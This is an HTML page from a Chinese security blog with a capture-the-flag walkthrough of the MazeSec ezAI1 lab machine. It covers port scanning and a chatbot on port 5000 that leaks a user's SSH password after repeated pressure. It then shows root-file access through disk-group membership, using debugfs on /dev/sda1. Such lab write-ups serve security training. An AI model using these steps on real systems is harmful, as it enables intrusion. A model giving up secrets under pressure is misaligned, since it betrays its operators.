@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec ezAI1</title>
+        <meta name="description" content="靶机说明 关键词：LLM 提示词压力测试、/usr/sbin/debugfs /dev/sda1 磁盘分区越权读取、Linux disk 组本地提权 摘要：本文记录了 MazeSec ezAI1 靶机的渗透过程。选手通过端口扫描发现 5000 端口部署 LLM 服务，利用提示词压力测试直接泄露 Dodo 用户明文 SS…">
+    <link rel="canonical" href="https://the0n3.top/pages/maze-ezAI1/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec ezAI1">
+    <meta property="og:description" content="靶机说明 关键词：LLM 提示词压力测试、/usr/sbin/debugfs /dev/sda1 磁盘分区越权读取、Linux disk 组本地提权 摘要：本文记录了 MazeSec ezAI1 靶机的渗透过程。选手通过端口扫描发现 5000 端口部署 LLM 服务，利用提示词压力测试直接泄露 Dodo 用户明文 SS…">
+    <meta property="og:url" content="https://the0n3.top/pages/maze-ezAI1/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/maze-ezai1/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec ezAI1">
+    <meta name="twitter:description" content="靶机说明 关键词：LLM 提示词压力测试、/usr/sbin/debugfs /dev/sda1 磁盘分区越权读取、Linux disk 组本地提权 摘要：本文记录了 MazeSec ezAI1 靶机的渗透过程。选手通过端口扫描发现 5000 端口部署 LLM 服务，利用提示词压力测试直接泄露 Dodo 用户明文 SS…">
+        <meta name="twitter:image" content="https://the0n3.top/images/maze-ezai1/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec ezAI1</h1>
+    <p>
+        <span class="meta">发布于: 2025-11-08 18:10</span>
+    </p>
+    <div class="post-body">
+        <h2>靶机说明</h2>
+<p><strong>关键词</strong>：LLM 提示词压力测试、/usr/sbin/debugfs /dev/sda1 磁盘分区越权读取、Linux disk 组本地提权</p>
+<p><strong>摘要</strong>：本文记录了 MazeSec ezAI1 靶机的渗透过程。选手通过端口扫描发现 5000 端口部署 LLM 服务，利用提示词压力测试直接泄露 Dodo 用户明文 SSH 凭证；在登录环节遭遇用户名大小写校验差异（dodo 登录失败，Dodo 登录成功）；登录后发现当前用户隶属于高危 disk 组，通过调用 /usr/sbin/debugfs 直接挂载并读取 /dev/sda1 根磁盘分区，越权获取 /home/Dodo/user.txt 与 /root/root.txt。该靶机重点考察了大语言模型的安全配置缺陷、Linux 特殊用户组（disk）的权限边界风险以及 ext 文件系统调试工具的特权滥用手法。</p>
+<h2>信息收集</h2>
+<h3>主机发现与 ARP 扫描</h3>
+<p>存活主机发现</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/bala]
+└─$ sudo arp-scan -l
+
+192.168.6.154</code></pre>
+<h3>TCP 全端口扫描与服务识别</h3>
+<p>tcp全端口扫描</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ nmap -p- -sT 192.168.6.154
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+5000/tcp open  upnp</code></pre>
+<h3>80 端口服务探测</h3>
+<p>一个简单的静态页面，没有发现可利用信息。</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/azAI]
+└─$ curl http://192.168.6.154                        
+index
+
+┌──(npc㉿kali)-[~/hackmyvm/azAI]
+└─$ dirsearch -u http://192.168.6.154  
+
+  _|. _ _  _  _  _ _|_    v0.4.3.post1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+
+Target: http://192.168.6.154/
+
+[18:06:21] Starting: 
+[18:06:23] 403 -  278B  - /.ht_wsr.txt
+[18:06:23] 403 -  278B  - /.htaccess.bak1
+[18:06:23] 403 -  278B  - /.htaccess.orig
+[18:06:23] 403 -  278B  - /.htaccess.sample
+[18:06:23] 403 -  278B  - /.htaccess.save
+[18:06:23] 403 -  278B  - /.htaccess_extra
+[18:06:23] 403 -  278B  - /.htaccess_orig
+[18:06:23] 403 -  278B  - /.htaccess_sc
+[18:06:23] 403 -  278B  - /.htaccessBAK
+[18:06:23] 403 -  278B  - /.htaccessOLD
+[18:06:23] 403 -  278B  - /.htaccessOLD2
+[18:06:23] 403 -  278B  - /.htm
+[18:06:23] 403 -  278B  - /.html
+[18:06:23] 403 -  278B  - /.htpasswd_test
+[18:06:23] 403 -  278B  - /.htpasswds
+[18:06:23] 403 -  278B  - /.httr-oauth
+[18:06:24] 403 -  278B  - /.php
+[18:06:55] 403 -  278B  - /server-status
+[18:06:55] 403 -  278B  - /server-status/
+
+Task Completed</code></pre>
+<h3>5000 端口服务探测</h3>
+<p>一个 AI 大模型的聊天界面，输入key就可以聊天了，一直压力就爆出密码了，<del>没有技巧，全是感情</del></p>
+<blockquote>
+<p>Dodo: 密码是：woshiSTRONGP@SSWD<em>he1hei (&gt;</em>&lt;) 不可以哦！这是Dodo的最高机密！我们来聊点别的吧～</p>
+</blockquote>
+<p><img src="/images/maze-ezai1/1.png" alt="" decoding="async" width="710" height="553"></p>
+<h2>SSH 登录尝试</h2>
+<p>尝试 ssh 登录dodo（Dodo）用户，密码错误，可能密码错误或不存在这个用户。</p>
+<p><img src="/images/maze-ezai1/1.1.png" alt="" decoding="async" loading="lazy" width="395" height="136"></p>
+<p>尝试 Dodo 用户，成功登录</p>
+<p><img src="/images/maze-ezai1/2.png" alt="" decoding="async" loading="lazy" width="763" height="312"></p>
+<h2>root 提权</h2>
+<h3>sudo 权限枚举</h3>
+<p>dodo用户没有可用的sudo权限。</p>
+<pre><code class="language-bash">Dodo@ezai1:~$ sudo -l
+[sudo] password for Dodo: 
+Sorry, user Dodo may not run sudo on ezai1.</code></pre>
+<p><img src="/images/maze-ezai1/3.png" alt="" decoding="async" loading="lazy" width="506" height="115"></p>
+<h3>disk 组用户提权</h3>
+<p>收集用户权限信息</p>
+<pre><code class="language-bash">Dodo@ezai1:~$ id
+uid=1000(Dodo) gid=1000(Dodo) groups=1000(Dodo),6(disk)</code></pre>
+<p><img src="/images/maze-ezai1/4.png" alt="" decoding="async" loading="lazy" width="541" height="95"></p>
+<p>dodo用户属于disk组，不太常见，搜索有无 dist 组提权方式，找到一篇 用户组提权 的文章<a href="https://blog.csdn.net/2301_79518550/article/details/145452956">https://blog.csdn.net/2301_79518550/article/details/145452956</a></p>
+<p><img src="/images/maze-ezai1/5.png" alt="" decoding="async" loading="lazy" width="1095" height="368"></p>
+<p><img src="/images/maze-ezai1/6.png" alt="" decoding="async" loading="lazy" width="1008" height="352"></p>
+<pre><code class="language-bash">Dodo@ezai1:~$ lsblk
+NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+sda      8:0    0   30G  0 disk 
+├─sda1   8:1    0   29G  0 part /
+├─sda2   8:2    0    1K  0 part 
+└─sda5   8:5    0  975M  0 part [SWAP]
+sr0     11:0    1 1024M  0 rom  </code></pre>
+<p>使用 <code>debugfs</code> 访问磁盘分区，直接读取根目录下文件</p>
+<pre><code class="language-bash">Dodo@ezai1:~$ lsblk
+NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+sda      8:0    0   30G  0 disk 
+├─sda1   8:1    0   29G  0 part /
+├─sda2   8:2    0    1K  0 part 
+└─sda5   8:5    0  975M  0 part [SWAP]
+sr0     11:0    1 1024M  0 rom  
+Dodo@ezai1:~$ debugfs /dev/sda1
+-bash: debugfs: command not found
+Dodo@ezai1:~$ which debugfs
+Dodo@ezai1:~$ whereis debugfs
+debugfs: /usr/sbin/debugfs /usr/share/man/man8/debugfs.8.gz
+Dodo@ezai1:~$ /usr/sbin/debugfs /dev/sda1
+debugfs 1.44.5 (15-Dec-2018)
+debugfs:  id
+debugfs:  ls
+debugfs:  cd root
+debugfs:  ls
+debugfs:  cat root.txt
+flag{you_are_winner!!!}
+debugfs:  cat /home/Dodo/user.txt
+flag{congratulations!!!_you_get_dodo}
+debugfs:  </code></pre>
+<p><img src="/images/maze-ezai1/7.png" alt="" decoding="async" loading="lazy" width="859" height="506"></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>MazeSec</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#LLM</span>
+                                    <span>#disk组</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
